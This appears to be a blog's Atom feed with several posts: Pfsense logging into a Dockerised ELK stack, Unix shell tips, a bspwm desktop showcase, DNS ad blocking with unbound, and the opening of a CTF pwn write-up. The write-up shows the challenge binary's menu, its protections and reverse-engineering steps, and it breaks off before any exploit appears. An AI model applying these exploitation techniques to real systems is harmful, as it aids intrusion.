          codec =&amp;gt; &amp;quot;json&amp;quot;
          workers =&amp;gt; 1
          index =&amp;gt; &amp;quot;logstash-%{+YYYY.MM.dd}&amp;quot;
          manage_template =&amp;gt; true
          template_name =&amp;gt; &amp;quot;logstash&amp;quot;
          template_overwrite =&amp;gt; false
          flush_size =&amp;gt; 100
          idle_flush_time =&amp;gt; 1
        }
}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Pfsense usually uses &lt;em&gt;re{0-9}&lt;/em&gt; as interface names. You could rename those fields
directly in logstash by adding an entry like this in the above config under the &lt;em&gt;filter&lt;/em&gt; element:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;if [iface] == &amp;quot;re0&amp;quot; {
  mutate {
    replace =&amp;gt; [ &amp;quot;iface&amp;quot;, &amp;quot;WAN&amp;quot; ]
  }
}
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Run the stack&lt;/h2&gt;
&lt;p&gt;Now that we have the configs, let's create the dockerfile as &lt;em&gt;docker-elk/dockerfile&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;FROM sebp/elk

# remove logstash config files
RUN rm /etc/logstash/conf.d/01-lumberjack-input.conf
RUN rm /etc/logstash/conf.d/02-beats-input.conf
RUN rm /etc/logstash/conf.d/10-syslog.conf
RUN rm /etc/logstash/conf.d/11-nginx.conf
RUN rm /etc/logstash/conf.d/30-output.conf

# add specific configs
ADD ./pfsense.conf /etc/logstash/conf.d/pfsense.conf
ADD ./pfsense.2.2.grok /etc/logstash/patterns/pfsense.2.2.grok
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This tells docker to:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;use &lt;a href="https://hub.docker.com/r/sebp/elk/"&gt;sebp/elk&lt;/a&gt; as a base image&lt;/li&gt;
&lt;li&gt;remove the configs distributed with the image&lt;/li&gt;
&lt;li&gt;add our specific config files (defined above)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Having all the above files in the same folder, build the docker image with:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;cd docker-elk/ &amp;amp;&amp;amp; docker build -t elk-pfsense .
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And finally run that container with:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;docker run -p 5601:5601 -p 9200:9200 -p 5000:5000/udp -v elk-data:/var/lib/elasticsearch -it --name elk elk-pfsense
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This does the following:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;link container's port 5601 to your host port 5601 (for Kibana)&lt;/li&gt;
&lt;li&gt;link container's port 9200 to your host port 9200 (for Elasticsearch)&lt;/li&gt;
&lt;li&gt;link container's port 5000 to your host port 5000 (for Logstash)&lt;/li&gt;
&lt;li&gt;create a volume called &lt;em&gt;elk-data&lt;/em&gt; to store the data&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;You can then detach from the docker shell using &lt;em&gt;CTRL + p + CTRL + q&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Before getting any further, there are two tweaks than need to be applied to
Elasticsearch.&lt;/p&gt;
&lt;p&gt;Since we're running a single ES node, the number of replicas must be set to 0. This
is done with following command:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;curl -XPUT http://localhost:9200/_settings -d &lt;span class="s1"&gt;&amp;#39;{ &amp;quot;number_of_replicas&amp;quot; :0 }&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;You might also want to increase the queue to avoid timeouts on kibana when
querying large quantity of data:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;curl -XPUT localhost:9200/_cluster/settings -d &lt;span class="s1"&gt;&amp;#39;{&amp;quot;transient&amp;quot; : {&amp;quot;threadpool.search.queue_size&amp;quot; : 2000}}&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Pfsense&lt;/h2&gt;
&lt;p&gt;Now that our ELK stack si ready, let's
redirect the firewall logs from Pfsense to it.
Login to Pfsense's web interface and go to &lt;strong&gt;Status&lt;/strong&gt; -&amp;gt; &lt;strong&gt;System Logs&lt;/strong&gt; -&amp;gt; &lt;strong&gt;Settings&lt;/strong&gt;,
then scroll down to &lt;strong&gt;Remote Logging Options&lt;/strong&gt; and tick &lt;strong&gt;Send log messages to remote syslog server&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Fill the entry &lt;strong&gt;Remote log servers&lt;/strong&gt; with your host running the stack (on port 5000).
Also tick the &lt;strong&gt;Firewall Events&lt;/strong&gt; and untick all the others.&lt;/p&gt;
&lt;p&gt;See &lt;a href="https://doc.pfsense.org/index.php/Log_Settings"&gt;https://doc.pfsense.org/index.php/Log_Settings&lt;/a&gt; for more.&lt;/p&gt;
&lt;h2&gt;Kibana&lt;/h2&gt;
&lt;p&gt;Connect to Kibana (http://[host-ip]:5601) and create a new time-based index based off this pattern: &lt;em&gt;logstash-&lt;/em&gt;*&lt;/p&gt;
&lt;p&gt;Then, after a while you should see points coming in kibana on the &lt;em&gt;Discover&lt;/em&gt; tab.&lt;/p&gt;
&lt;p&gt;Finally create a dashboard with these information:&lt;/p&gt;
&lt;p&gt;&lt;a href="https://deadc0de.re/images/kibana.png"&gt;&lt;img alt="kibana dashboard" src="https://deadc0de.re/images/kibana.png" width="800px"&gt;&lt;/a&gt;&lt;/p&gt;</content><category term="elk"></category><category term="pfsense"></category><category term="monitoring"></category><category term="docker"></category></entry><entry><title>Unix tricks 2</title><link href="https://deadc0de.re/articles/unix-tricks-2.html" rel="alternate"></link><published>2016-08-22T00:00:00+02:00</published><updated>2016-08-22T00:00:00+02:00</updated><author><name>deadc0de</name></author><id>tag:deadc0de.re,2016-08-22:/articles/unix-tricks-2.html</id><summary type="html">&lt;p&gt;Unix tricks 2&lt;/p&gt;</summary><content type="html">&lt;p&gt;some more neat unix tricks&lt;/p&gt;
&lt;h2&gt;Editing binary with vim&lt;/h2&gt;
&lt;p&gt;Open the binary in vim with&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;:% !xxd &amp;lt;file-path&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;change the needed parts and then save it with:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;:% !xxd -r
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Ssh escape sequences&lt;/h2&gt;
&lt;p&gt;You can control some SSH settings when inside an SSH
session using the escape sequences: &lt;code&gt;&amp;lt;enter&amp;gt;~&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;With &lt;code&gt;?&lt;/code&gt; you get a list of available options:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;when &lt;a href="https://www.youtube.com/watch?v=Wn2w3j_xmbw"&gt;all hope is gone&lt;/a&gt;
    use &lt;code&gt;&amp;lt;enter&amp;gt;~.&lt;/code&gt; to close the session&lt;/li&gt;
&lt;li&gt;when you want to increase/decrease verbosity use
    &lt;code&gt;&amp;lt;enter&amp;gt;~V/v&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;when you want to put in background use &lt;code&gt;&amp;lt;enter&amp;gt;~&amp;amp;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;...&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;For a list of all options, see ssh's man page under &lt;code&gt;ESCAPE CHARACTERS&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;man --pager&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;less -p ^ESCAPE&amp;#39;&lt;/span&gt; ssh
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Average over multiple lines&lt;/h2&gt;
&lt;p&gt;Use &lt;code&gt;awk&lt;/code&gt; to sum all lines and get the average of the sum at the end.
This is useful for example for a stripped &lt;code&gt;wc&lt;/code&gt; command's output.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;... &lt;span class="p"&gt;|&lt;/span&gt; awk &lt;span class="s1"&gt;&amp;#39;{ sum += $1; n++ } END { if (n &amp;gt; 0) printf &amp;quot;%.f\n&amp;quot;,(sum / n); }&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Quick'n'dirty share on LAN&lt;/h2&gt;
&lt;p&gt;Let's say you want to quickly share something without much
  fuss, use python &lt;a href="https://docs.python.org/2/library/simplehttpserver.html"&gt;SimpleHTTPServer&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nv"&gt;SHARE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/tmp/share&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; mkdir -p &lt;span class="nv"&gt;$SHARE&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nb"&gt;cd&lt;/span&gt; &lt;span class="nv"&gt;$SHARE&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; python -m SimpleHTTPServer
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Then copy what to want to share into &lt;code&gt;$SHARE&lt;/code&gt; and simply access it on http://your-ip-here:8000&lt;/p&gt;
&lt;h2&gt;Add comma to all lines except the last one&lt;/h2&gt;
&lt;p&gt;Easily append a comma to each line except the last one:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ cat /tmp/tmp
a
b
c
d
e
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;use &lt;code&gt;awk&lt;/code&gt; to transform each line and &lt;code&gt;wc&lt;/code&gt; to calculate the total number of line for the if clause:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ cat /tmp/tmp &lt;span class="p"&gt;|&lt;/span&gt; awk -v &lt;span class="nv"&gt;nlines&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;wc -l &amp;lt; /tmp/tmp&lt;span class="sb"&gt;`&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;{if (NR == nlines) {print $0} else {print $0&amp;quot;,&amp;quot;}}&amp;#39;&lt;/span&gt;
a,
b,
c,
d,
e
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Unix time (epoch)&lt;/h2&gt;
&lt;p&gt;A nice &lt;code&gt;dmesg&lt;/code&gt; switch is &lt;code&gt;-T&lt;/code&gt; which translates the unix times of each line
  into human readable date/time.&lt;/p&gt;
&lt;p&gt;Otherwise you could always use the unix tool &lt;code&gt;date&lt;/code&gt; to transform epoch to
  human readable date/time with following command:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;date -d @&amp;lt;epoch&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Bash script duration&lt;/h2&gt;
&lt;p&gt;I often use either &lt;code&gt;time&lt;/code&gt; or enclose my process within two &lt;code&gt;date&lt;/code&gt; calls to
monitor the duration of a script.&lt;/p&gt;
&lt;p&gt;One interesting built-in shell variable is &lt;code&gt;SECONDS&lt;/code&gt; which will output, each time
it is referenced, the number of seconds ellapsed since shell invocation.&lt;/p&gt;
&lt;p&gt;This example script&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/bin/bash&lt;/span&gt;
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$SECONDS&lt;/span&gt;
sleep &lt;span class="m"&gt;10&lt;/span&gt;
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$SECONDS&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;will produce&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;
&lt;span class="m"&gt;10&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;see more info on built-in shell variables &lt;a href="http://wiki.bash-hackers.org/syntax/shellvars"&gt;here&lt;/a&gt;&lt;/p&gt;</content><category term="unix"></category><category term="cli"></category><category term="shell"></category></entry><entry><title>Unix porn</title><link href="https://deadc0de.re/articles/unix-porn.html" rel="alternate"></link><published>2016-08-04T00:00:00+02:00</published><updated>2016-08-04T00:00:00+02:00</updated><author><name>deadc0de</name></author><id>tag:deadc0de.re,2016-08-04:/articles/unix-porn.html</id><summary type="html">&lt;p&gt;from awesomewm to bspwm&lt;/p&gt;</summary><content type="html">&lt;p&gt;After &lt;a href="https://i3wm.org/"&gt;i3&lt;/a&gt; and more recently &lt;a href="https://awesome.naquadah.org/"&gt;awesome3.4&lt;/a&gt;,
I finally moved to &lt;a href="https://github.com/baskerville/bspwm"&gt;bspwm&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Here are two screenshots of what my desktop looked like under &lt;a href="https://awesome.naquadah.org/"&gt;awesome&lt;/a&gt;:&lt;/p&gt;
&lt;p&gt;&lt;a href="http://i.imgur.com/i3eVXPe.jpg"&gt;&lt;img alt="awesome wm clean" src="http://i.imgur.com/i3eVXPe.jpg" title="awesome clean" width="800px"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="http://i.imgur.com/fypLp5T.jpg"&gt;&lt;img alt="awesome wm dirty" src="http://i.imgur.com/fypLp5T.jpg" title="awesome dirty" width="800px"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;I recently stumbled upon this very nice subreddit &lt;a href="https://www.reddit.com/r/unixporn/"&gt;unix porn&lt;/a&gt;.
On it I came across some great desktops using that new window manager &lt;a href="https://github.com/baskerville/bspwm"&gt;bspwm&lt;/a&gt;
with &lt;a href="https://github.com/jaagr/lemonbuddy"&gt;lemonbuddy&lt;/a&gt; bar
and decided to give it a try. Here's how my desktop now looks like:&lt;/p&gt;
&lt;p&gt;&lt;a href="http://i.imgur.com/DAaUb8V.jpg"&gt;&lt;img alt="bspwm clean" src="http://i.imgur.com/DAaUb8V.jpg" title="bspwm clean" width="800px"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="http://i.imgur.com/9hcxr2s.jpg"&gt;&lt;img alt="bspwm dirty" src="http://i.imgur.com/9hcxr2s.jpg" title="bspwm dirty" width="800px"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;I based my configs on dotfiles found on &lt;a href="https://www.reddit.com/r/unixporn/"&gt;unix porn&lt;/a&gt;
and bar's configurations from the creator of &lt;a href="https://github.com/jaagr/lemonbuddy"&gt;lemonbuddy&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Besides its beauty, &lt;a href="https://github.com/baskerville/bspwm"&gt;bspwm&lt;/a&gt; is definitely a very nice
tiling window manager, the simplicity of its configuration,
and the fact it is so easily customizable makes
it the perfect wm for tiling wm's lovers !&lt;/p&gt;
&lt;p&gt;Happy ricing guys !&lt;/p&gt;
&lt;p&gt;references:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://imgur.com/a/3c5f2"&gt;my desktops printscreens&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/baskerville/bspwm"&gt;bspwm&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/jaagr/lemonbuddy"&gt;lemonbuddy&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://alpha.wallhaven.cc/wallpaper/12018"&gt;wallpaper awesome&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://alpha.wallhaven.cc/wallpaper/418672"&gt;wallpaper bspwm&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.reddit.com/r/unixporn/"&gt;unix porn on reddit&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/jaagr/dots/tree/master/.local/etc/themer/themes/darkpx"&gt;lemonbuddy config 1&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/jaagr/lemonbuddy/blob/master/config"&gt;lemonbuddy config 2&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/stark/siji"&gt;siji fonts&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/osense/bar"&gt;lemonbar&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://git.2f30.org/colors/"&gt;png colors tool&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/pvinis/colortools"&gt;colortools&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/dylanaraps/neofetch"&gt;neofetch&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://romainl.github.io/Apprentice/"&gt;vim colorscheme&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;BTW here are some links I use to find nice colorschemes for my desktops:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.xcolors.net/"&gt;xcolors&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://terminal.sexy/"&gt;terminal.sexy&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://ciembor.github.io/4bit/"&gt;4bit&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://dotshare.it/"&gt;dotshare.it&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://sweyla.com/themes/"&gt;sweyla&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://vimcolors.com/"&gt;vimcolors&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://cocopon.me/app/vim-color-gallery/"&gt;vim colorscheme gallery&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://bytefluent.com/vivify/"&gt;vivify&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="unix porn"></category><category term="bspwm"></category><category term="lemonbar"></category><category term="lemonbuddy"></category><category term="awesome"></category></entry><entry><title>Blocking ads and malwares with unbound</title><link href="https://deadc0de.re/articles/unbound-blocking-ads.html" rel="alternate"></link><published>2016-06-12T00:00:00+02:00</published><updated>2016-06-12T00:00:00+02:00</updated><author><name>deadc0de</name></author><id>tag:deadc0de.re,2016-06-12:/articles/unbound-blocking-ads.html</id><summary type="html">&lt;p&gt;Block ads and malwares on unbound&lt;/p&gt;</summary><content type="html">&lt;p&gt;Here's a small post on how to (DNS-)block ads, malwares, social networks and whatnot
on your network using unbound.&lt;/p&gt;
&lt;p&gt;Unbound is the default DNS resolver on Pfsense 2.2. Adding a list of domains to block
will help you speed up your connections, potentially secure it (malwares, ...) and
might also avoid being tracked.&lt;/p&gt;
&lt;p&gt;To get a good list of domains, the consolidated lists of StevenBlack are very
useful and can be downloaded from &lt;a href="https://github.com/StevenBlack/hosts"&gt;his github&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Here are the different steps to set it up for unbound:&lt;/p&gt;
&lt;p&gt;Download the list you're interested to block (for example ads+malwares+social networks)&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ wget https://raw.githubusercontent.com/StevenBlack/hosts/master/alternates/social/hosts
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Entries in the host file are in the form &lt;code&gt;0.0.0.0 &amp;lt;domain&amp;gt;&lt;/code&gt; and unbound needs something like this:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;local-zone: &lt;span class="s2"&gt;&amp;quot;&amp;lt;domain&amp;gt;&amp;quot;&lt;/span&gt; redirect
local-data: &lt;span class="s2"&gt;&amp;quot;&amp;lt;domain&amp;gt; A 0.0.0.0&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Following awk command will transform the list into something that unbound understands:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ cat hosts &lt;span class="p"&gt;|&lt;/span&gt; grep &lt;span class="s1"&gt;&amp;#39;^0\.0\.0\.0&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; awk &lt;span class="s1"&gt;&amp;#39;{print &amp;quot;local-zone: \&amp;quot;&amp;quot;$2&amp;quot;\&amp;quot; redirect\nlocal-data: \&amp;quot;&amp;quot;$2&amp;quot; A 0.0.0.0\&amp;quot;&amp;quot;}&amp;#39;&lt;/span&gt; &amp;gt; ads.conf
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Finally copy the resulting file to pfsense (or to your DNS resolver running unbound).&lt;/p&gt;
&lt;p&gt;For pfsense, copy the file to &lt;code&gt;/var/unbound/&lt;/code&gt; and paste following lines into the
&lt;code&gt;Display Custom Option&lt;/code&gt; field on Unbound config page on pfsense's web interface.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# Ads overrides&lt;/span&gt;
include: /var/unbound/ads.conf
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;For other unbound setups, edit the &lt;code&gt;unbound.conf&lt;/code&gt; file and add previous lines (do not
forget to update the path to the file as it might not be &lt;code&gt;/var/unbound&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;You can then reload unbound config with the following command on pfsense:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ unbound-control -c /var/unbound/unbound.conf reload
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;That's it, added domains will resolve to 0.0.0.0 on your DNS resolver and thus
would be blocked. Be aware that if some of those are already in the cache of your
host, they would resolve until cache is cleared.&lt;/p&gt;</content><category term="unbound"></category><category term="ads"></category><category term="malware"></category><category term="pfsense"></category></entry><entry><title>Insomni'hack microwave write-up</title><link href="https://deadc0de.re/articles/microwave-write-up.html" rel="alternate"></link><published>2016-03-21T00:00:00+01:00</published><updated>2016-03-21T00:00:00+01:00</updated><author><name>deadc0de</name></author><id>tag:deadc0de.re,2016-03-21:/articles/microwave-write-up.html</id><summary type="html">&lt;p&gt;Insomni'hack microwave write-up&lt;/p&gt;</summary><content type="html">&lt;p&gt;This is a write-up for the &lt;em&gt;microwave&lt;/em&gt; pwn of
&lt;a href="https://insomnihack.ch/"&gt;Insomni'hack&lt;/a&gt; CTF.&lt;/p&gt;
&lt;p&gt;Following binaries were given:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;microwave_61f50dba931bb10ab3089215b2e188f4&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;libc.so.6&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Those are both available &lt;a href="https://gitlab.com/deadc0de6/ctf/tree/master/2016-insomnihack"&gt;here&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;The program&lt;/h2&gt;
&lt;p&gt;The program simulates a microwave able to connect to twitter
and tweets your favorite food.&lt;/p&gt;
&lt;p&gt;There are 4 options:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;(1) &lt;em&gt;Connect to Twitter account&lt;/em&gt;: asks for username and password
    to connect to twitter&lt;/li&gt;
&lt;li&gt;(2) &lt;em&gt;Edit your tweet&lt;/em&gt;: edit content of the tweet(s) to be sent&lt;/li&gt;
&lt;li&gt;(3) &lt;em&gt;Grill &amp;amp; Tweet your food&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;(4) &lt;em&gt;Exit&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Connect to twitter:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt; --------------------------------------------------------
 |     Welcome to the next generation of MicroWaves!    |
 |                         ***                          |
 | This stylish Microwave with Grill function, includes |
 |      a function that tweets your favourite food!     |
 |                         ***                          |
 --------------------------------------------------------
           ----------------------------------
           |  1. Connect to Twitter account |
           |  2. Edit your tweet            |
           |  3. Grill &amp;amp; Tweet your food    |
           |  q. Exit                       |
           ----------------------------------

           [MicroWave]: 1

           Log in on Twitter:
           username: test
           password: test

Checking test
Twitter account
...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Edit your tweet:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;           ----------------------------------
           |  1. Connect to Twitter account |
           |  2. Edit your tweet            |
           |  3. Grill &amp;amp; Tweet your food    |
           |  q. Exit                       |
           ----------------------------------

           [MicroWave]: 2

           #&amp;gt; some blabla

           Done.
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Grill and tweet:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;           ----------------------------------
           |  1. Connect to Twitter account |
           |  2. Edit your tweet            |
           |  3. Grill &amp;amp; Tweet your food    |
           |  q. Exit                       |
           ----------------------------------

           [MicroWave]: 3



  Okay! Let&amp;#39;s do this!
...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Here are the protections of the binary&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ checksec microwave_61f50dba931bb10ab3089215b2e188f4
&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/tmp/microwave_61f50dba931bb10ab3089215b2e188f4&amp;#39;&lt;/span&gt;
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;The vulnerabilities&lt;/h2&gt;
&lt;h3&gt;Find the password&lt;/h3&gt;
&lt;p&gt;First we need a valid username/password to connect to the fake
twitter account. The username can be anything, however the function
containing the &lt;em&gt;Checking&lt;/em&gt; string shows where the password is checked
(and what it is):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x00000ac0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;iz&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="n"&gt;grep&lt;/span&gt; &lt;span class="n"&gt;Checking&lt;/span&gt;
&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x00000ac0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;axt&lt;/span&gt; &lt;span class="mh"&gt;0x00002ac0&lt;/span&gt;
&lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="mh"&gt;0xf03&lt;/span&gt; &lt;span class="n"&gt;lea&lt;/span&gt; &lt;span class="n"&gt;rsi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;rip&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x1bb6&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="n"&gt;sub&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;__printf_chk_f00&lt;/span&gt;
&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x00000ac0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;pd&lt;/span&gt; &lt;span class="mh"&gt;@0xf03&lt;/span&gt;

&lt;span class="p"&gt;...&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;snip&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;...&lt;/span&gt;

